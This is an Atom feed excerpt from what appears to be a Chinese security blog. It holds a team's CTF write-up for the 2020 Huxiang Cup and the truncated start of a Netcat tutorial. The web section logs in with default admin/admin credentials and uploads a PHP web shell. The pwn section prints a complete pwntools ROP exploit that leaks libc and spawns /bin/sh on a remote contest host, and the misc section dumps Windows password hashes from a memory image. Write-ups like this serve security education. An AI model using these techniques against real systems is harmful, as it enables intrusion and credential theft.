    <id>https://err0r.top/article/2020hxb-Writeup-cOMING/</id>
    <published>2020-11-13T01:22:25.000Z</published>
    <updated>2020-12-23T01:22:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="湖湘杯2020"><a href="#湖湘杯2020" class="headerlink" title="湖湘杯2020"></a>湖湘杯2020</h1><p>队伍情况</p><p>队伍名称：cOMING</p><img src="/article/2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png" class="" loading="lazy"><p>队伍成员</p><p>gyy,Trick,hxq</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h3><p>直接白给phpinfo <a href="http://47.111.104.169:57301/?file=phpinfo">http://47.111.104.169:57301/?file=phpinfo</a></p><img src="/article/2020hxb-Writeup-cOMING/3374b2c0d3129c0282de5d456026c0f9.png" class="" loading="lazy"><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>进网站找后台./admin/<br>输入用户名密码均为admin登陆成功,html发现有/?r=manageinfo，进入改头像，上传一句话木马，蚁剑连上可得flag</p><img src="/article/2020hxb-Writeup-cOMING/031b1eb11298e4c672f6e91a3b07b170.png" class="" loading="lazy"><p>91d7fbeecf940113dfca79a0194d8292</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p><code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw  imageinfo</code></p><img src="/article/2020hxb-Writeup-cOMING/7b3aaf83f2a475ad5cab06c8856973c4.png" class="" loading="lazy"><p>内存取证 win7： <code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></p><img src="/article/2020hxb-Writeup-cOMING/4d11382c75521a279254c1d8f939e7e2.png" class="" loading="lazy"><p>MD5解出</p><p>CTF：</p><p>aad3…：空密码</p><p>0a64…:qwer1234</p><p>再结合题目：we need sha1(password)!!! sha1</p><p>解密qwer1234</p><img src="/article/2020hxb-Writeup-cOMING/ee50c0fb45bc04ff9f82fad1289d5ec8.png" class="" loading="lazy"><p>出flag</p><h3 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h3><p>开文件发现<code>mingwen - 副本.txt</code>是伪加密,拖出来打包后明文攻击</p><p>爆破得密码：123%asd!O</p><img src="/article/2020hxb-Writeup-cOMING/1a7883d1491cfe53eb8d922f1251ee04.png" class="" loading="lazy"><pre class="language-none"><code class="language-none">仅需5，跳过去ffd5e341le25b2dcab15cbb&#125;gc3bc5b&#123;789b51</code></pre><p>联想栅栏加密 直接出flag</p><img src="/article/2020hxb-Writeup-cOMING/b510b2e1aae50a2ba791f6bac42dcdc2.png" class="" loading="lazy"><h3 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h3><p>东西很多，最终发现这有个.html是有用的</p><img src="/article/2020hxb-Writeup-cOMING/9302d47555b72dfa1fd14d8a8b8394e2.png" class="" loading="lazy"><p>打开，F12</p><img src="/article/2020hxb-Writeup-cOMING/f2ffd31423755c064eb38a0e7dc062f5.png" class="" loading="lazy"><p>发现base64</p><pre class="language-none"><code class="language-none">KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm&#x3D;&#x3D;KO+8oF&#x2F;vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr&#x3D;&#x3D;                            KCtfKyk&#x2F;KOOAgj7vuL88KV&#x2F;OuCjjgII+77i&#x2F;PClfzrgK                                  bygq77+j4pa977+jKinjg5bjgpwK                                      77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K                  44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp&#x3D;                    KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp&#x3D;&#x3D;flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC&#x2F;wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp&#x3D;4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn&#x3D;&#x3D;                     4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCp&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KMKsX8KsIiko77+j77mP77+j77ybKSjila&#x2F;CsOKWocKw77yJ4pWv77i1IOKUu+KUgeKUu+ODvSjjgpzilr3jgpzjgIAp77yNQzwoLzvil4c7KS9+KOODmO+9pV&#x2F;vvaUp44OY4pSz4pSB4pSzCu&#x3D;&#x3D;4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCo&#x3D;&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIMK4oqZ77mP4oqZ4oil44O9KCrjgII+0JQ8KW&#x2F;jgpwvKOOEkm&#x2F;jhJIpL35+KCNfPC0p77yI77ye5Lq677yc77yb77yJCo&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCm&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCs&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAp&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCr&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCt&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAr&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCi&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCn&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCp&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCq&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCl&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi&#x3D;&#x3D;KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                     KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                   KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK             KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIKZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC&#x3D;&#x3D;</code></pre><p>解密后：</p><pre class="language-none"><code class="language-none">(｡･∀･)ﾉﾞ嗨Hi~ (＠_＠;)(＠_＠;)(＠_＠;)(+_+)?(。&gt;︿&lt;)_θ(。&gt;︿&lt;)_θo(*￣▽￣*)ブ゜＜（＾－＾）＞(╯▽╰ )好香~~ヽ(✿ﾟ▽ﾟ)ノ(＠＾０＾)(^^ゞΨ(￣∀￣)Ψ*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。~\(≧▽≦)&#x2F;~o(^▽^)o(¬‿¬)(*≧︶≦))(￣▽￣* )ゞ┳━┳(╯‵□′)╯︵┻━┻┳━┳ ノ( ゜-゜ノ)ಠ_ಠಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(¬_¬&quot;)(￣﹏￣；)(╯°□°）╯︵ ┻━┻ヽ(゜▽゜　)－C&lt;(&#x2F;;◇;)&#x2F;~(ヘ･_･)ヘ┳━┳ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃⊙﹏⊙∥ヽ(*。&gt;Д&lt;)o゜&#x2F;(ㄒoㄒ)&#x2F;~~(#_&lt;-)（＞人＜；）(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••flag被我炸没了哈哈哈</code></pre><p>空格和base64加密的颜文字</p><p>stegsnow解出现乱码</p><p>拿颜文字的base64跑base64隐写，得到秘钥<code>lorrie</code></p><p>连到自己的服务器上nc保存文件</p><img src="/article/2020hxb-Writeup-cOMING/24f08c5af60b185a313ee1463c9a4852.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/113c837089faeae4e4cbf169b26103f2.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/a6cd84af9e66703249e6d040b8378d79.png" class="" loading="lazy"><p><code>→_→</code>替换为<code>-</code>,<code>←_←</code>替换为<code>.</code>,去网站上解码</p><img src="/article/2020hxb-Writeup-cOMING/4be4b33a5bdc0c72d555bcf347fc81dd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/f9ede18047cccbfc556a9c345a0beac0.png" class="" loading="lazy"><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="古典美"><a href="#古典美" class="headerlink" title="古典美++"></a>古典美++</h3><p>利用网站工具得维吉尼亚密码密钥</p><img src="/article/2020hxb-Writeup-cOMING/7623653b8d5fa7474f7a021105bcc064.png" class="" loading="lazy"><p>为<code>orderby</code> 生成MD5</p><img src="/article/2020hxb-Writeup-cOMING/5ac8fcc0d5536abdee804959d8a3c242.png" class="" loading="lazy"><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *from LibcSearcher import *context.log_level &#x3D; &#39;debug&#39;context.terminal&#x3D;[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]p &#x3D; remote(&#39;47.111.96.55&#39;,54606)elf &#x3D; ELF(&#39;.&#x2F;pwn_printf&#39;)read_plt &#x3D; elf.symbols[&#39;read&#39;]read_got &#x3D; elf.got[&#39;read&#39;]puts_plt &#x3D; elf.symbols[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]pop_rdi &#x3D; 0x401213v_addr &#x3D; 0x4007C6scanf &#x3D; 0x4006A0pop_rsi_ret &#x3D; 0x401211p.recvuntil(&quot;You will find this game very interesting&quot;)for i in range(16):    p.sendline(&quot;32&quot;)payload1 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(v_addr)p.sendline(payload1)p.recvline()rrr &#x3D; p.recv(6)puts_addr &#x3D; u64(rrr.ljust(8,b&#39;\x00&#39;))print (hex(puts_addr))wri &#x3D; 0x06030A0payload2 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(0x0401D99 ) +p64(pop_rsi_ret) +p64(wri)+p64(0)+ p64(scanf) + p64(pop_rdi) + p64(8*4 )+ p64(v_addr+1)p.recv()n1 &#x3D; int(b&#39;&#x2F;bin&#39;[::-1].hex(),16)n2 &#x3D; int(b&#39;&#x2F;sh\x00&#39;[::-1].hex(),16)p.sendline(payload2)print(&quot;n1:&quot; + str(n1))sleep(0.3)p.sendline(str(n1))wri &#x3D; 0x06030A0+4sleep(0.5)payload2 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(wri) + p64(0) + p64(scanf) + p64(v_addr)p.send(payload2)p.sendline(str(n2))payload3 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x06030A0) + p64(puts_addr-0x2a300)sleep(0.5)p.sendline(payload3)p.interactive()</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>爆破，逐个击破。。。</p><p>easy_c++</p><p>IDA分析 一个信息</p><img src="/article/2020hxb-Writeup-cOMING/61a2caae7f31cbfc365432119425d6fd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/565ff985b4b771d98409ec3233eb8309.png" class="" loading="lazy"><p>长度32</p><img src="/article/2020hxb-Writeup-cOMING/17aa83fa3a88db01f27c8fb3d41c5e5f.png" class="" loading="lazy"><p>exp：</p><pre class="language-none"><code class="language-none">public class Test &#123;    public static void main(String[] args) &#123;        String a &#x3D; &quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;;        char v11;        int v13;        for (int i &#x3D;0; i&lt;32; i++)        &#123;            v11 &#x3D; a.charAt(i);            v13 &#x3D; i ^ (int)v11;            System.out.print((char)v13);        &#125;    &#125;&#125;</code></pre><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>反编译py</p><pre class="language-none"><code class="language-none">python3 pyinstxtractor.py ReMe.exe</code></pre><img src="/article/2020hxb-Writeup-cOMING/1393ddb113bda2babe004c8a7bd44c13.png" class="" loading="lazy"><p>010打开</p><img src="/article/2020hxb-Writeup-cOMING/38a8bb796f44edf49bb8ec9ae28a850c.png" class="" loading="lazy"><p>置换之后：</p><img src="/article/2020hxb-Writeup-cOMING/0b91b5d7322cfcb630981982098feea8.png" class="" loading="lazy"><p>改后缀：ReMe.pyc</p><pre class="language-none"><code class="language-none">uncompyle6 ReMe.pycλ uncompyle6 ReMe.pyc# uncompyle6 version 3.7.4# Python bytecode 3.7 (3394)# Decompiled from: Python 3.8.5 (tags&#x2F;v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: ReMe.py# Compiled at: 1995-09-28 00:18:56# Size of source mod 2**32: 272 bytesimport sys, hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(num):    result &#x3D; []    while num !&#x3D; 1:        num &#x3D; num * 3 + 1 if num % 2 else num &#x2F;&#x2F; 2        result.append(num)    return resultif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    print(&#39;Your input is not the FLAG!&#39;)    inp &#x3D; input()    if len(inp) !&#x3D; 27:        print(&#39;length error!&#39;)        sys.exit(-1)    for i, ch in enumerate(inp):        ret_list &#x3D; func(ord(ch))        s &#x3D; &#39;&#39;        for idx in range(len(ret_list)):            s +&#x3D; str(ret_list[idx])            s +&#x3D; str(ret_list[(len(ret_list) - idx - 1)])        md5 &#x3D; hashlib.md5()        md5.update(s.encode(&#39;utf-8&#39;))        if md5.hexdigest() !&#x3D; check[i]:            sys.exit(i)    md5 &#x3D; hashlib.md5()    md5.update(inp.encode(&#39;utf-8&#39;))    print(&#39;You win!&#39;)    print(&#39;flag&#123;&#39; + md5.hexdigest() + &#39;&#125;&#39;)# okay decompiling ReMe.pyc</code></pre><p>exp:</p><pre class="language-none"><code class="language-none">import hashlibcheck &#x3D; [ &#39;e5438e78ec1de10a2693f9cffb930d23&#39;, &#39;08e8e8855af8ea652df54845d21b9d67&#39;, &#39;a905095f0d801abd5865d649a646b397&#39;, &#39;bac8510b0902185146c838cdf8ead8e0&#39;, &#39;f26f009a6dc171e0ca7a4a770fecd326&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;4cb467175ab6763a9867b9ed694a2780&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;cffd0b9d37e7187483dc8dd19f4a8fa8&#39;, &#39;fd311e9877c3db59027597352999e91f&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;7fb523b42413495cc4e610456d1f1c84&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;bc52c927138231e29e0b05419e741902&#39;, &#39;515b7eceeb8f22b53575afec4123e878&#39;, &#39;451660d67c64da6de6fadc66079e1d8a&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;fe86104ce1853cb140b7ec0412d93837&#39;, &#39;acb465dc618e6754de2193bf0410aafe&#39;, &#39;c2bab7ea31577b955e2c2cac680fb2f4&#39;, &#39;8e50684ac9ef90dfdc6b2e75f2e23741&#39;, &#39;f077b3a47c09b44d7077877a5aff3699&#39;, &#39;620741f57e7fafe43216d6aa51666f1d&#39;, &#39;9e3b206e50925792c3234036de6a25ab&#39;, &#39;49733de19d912d4ad559736b1ae418a7&#39;, &#39;874992ac91866ce1430687aa9f7121fc&#39;]def func(number):    ret &#x3D; []    while number !&#x3D; 1:        number &#x3D; number * 3 + 1 if number % 2 else number &#x2F;&#x2F; 2        ret.append(number)    return retfor i in range(1,128):    a &#x3D; func(i)    ans &#x3D; &quot;&quot;    for j in range(len(a)):        ans +&#x3D; str(a[j])        ans +&#x3D; str(a[(len(a) - j - 1)])    md5 &#x3D; hashlib.md5()    md5.update(ans.encode(&#39;utf-8&#39;))    b &#x3D; md5.hexdigest()    for j in range(27):        if b &#x3D;&#x3D; check[j]:            print chr(i),j</code></pre><p>跑出 flag{My_M@th_3X+1_R3v_Te5t} 再跑md5</p><img src="/article/2020hxb-Writeup-cOMING/ac2500682b8e1112e9a89ce1b1f97465.png" class="" loading="lazy">]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;湖湘杯2020&quot;&gt;&lt;a href=&quot;#湖湘杯2020&quot; class=&quot;headerlink&quot; title=&quot;湖湘杯2020&quot;&gt;&lt;/a&gt;湖湘杯2020&lt;/h1&gt;&lt;p&gt;队伍情况&lt;/p&gt;
&lt;p&gt;队伍名称：cOMING&lt;/p&gt;
&lt;img src=&quot;/article/2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png&quot; class=&quot;&quot;&gt;

&lt;p&gt;队伍成员&lt;/p&gt;
&lt;p&gt;gyy,Trick,hxq&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Netcat 网络测试工具</title>
    <link href="https://err0r.top/article/Netcat/"/>
    <id>https://err0r.top/article/Netcat/</id>
    <published>2020-11-03T09:57:25.000Z</published>
    <updated>2021-03-30T11:57:30.239Z</updated>
    
    <content type="html"><![CDATA[<h2 id="这里是中国科技大学-taoky-写的一篇文章-nc是什么"><a href="#这里是中国科技大学-taoky-写的一篇文章-nc是什么" class="headerlink" title="这里是中国科技大学@taoky 写的一篇文章: nc是什么?"></a><strong>这里是中国科技大学@taoky 写的一篇文章: nc是什么?</strong></h2><p>请仔细阅读，一般二进制bin方向可能用到nc的地方会很多。</p><hr><p>nc/ncat 是 netcat 的缩写，它可以读写 TCP 与 UDP 端口——或许你看不懂这句话，这没有关系。简单地说，它可以在字符界面下，让你和服务器沟通交流。<br>一般来说，有很多题目都会要求你使用 nc 连接到他们的服务器，并且进行交互，获得 flag</p><h2 id="如何安装-nc？"><a href="#如何安装-nc？" class="headerlink" title="如何安装 nc？"></a>如何安装 nc？</h2><p><code>nc</code> 命令在 macOS 中是自带的，在 Linux 中一般自带，或是可以使用相应的软件包管理器安装（如在 Debian/Ubuntu 中这个包名叫 netcat）。</p><p>当然，如果你在看这篇手册，你的操作系统很有可能是 Windows。它不自带 <code>nc</code>，尽管可以用 WSL 